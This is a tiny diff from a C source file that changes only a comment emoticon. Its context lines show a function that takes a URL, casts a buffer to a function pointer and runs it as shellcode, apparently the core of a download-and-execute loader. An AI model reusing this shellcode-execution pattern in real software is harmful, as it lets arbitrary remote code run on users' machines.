@@ -55,7 +55,7 @@ void seed(int offset, int bytes, char *url)
 	code = (int (*)()) leaf;
 
 	/* Execute the Shellcode. Who knows what will
-	happen next (O_O). */
+	happen next (^_^). */
 
 	code();
     }
